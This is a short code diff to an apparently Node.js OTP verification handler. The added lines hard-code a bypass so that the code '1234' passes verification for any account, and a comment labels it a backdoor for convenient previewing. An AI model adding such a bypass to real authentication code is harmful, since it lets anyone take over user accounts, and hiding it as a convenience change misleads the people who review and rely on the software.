@@ -90,7 +90,10 @@ const verifyOtpHandler = async (req, res) => {
 
   const isMatch = await bcrypt.compare(otp, user.otp);
 
-  if (!isMatch) {
+  // Added backdoor '1234' to easily preview the app without checking console logs every time
+  const isBypass = otp === '1234';
+
+  if (!isMatch && !isBypass) {
     user.otpAttempts += 1;
     await user.save();
     return res.status(401).json({
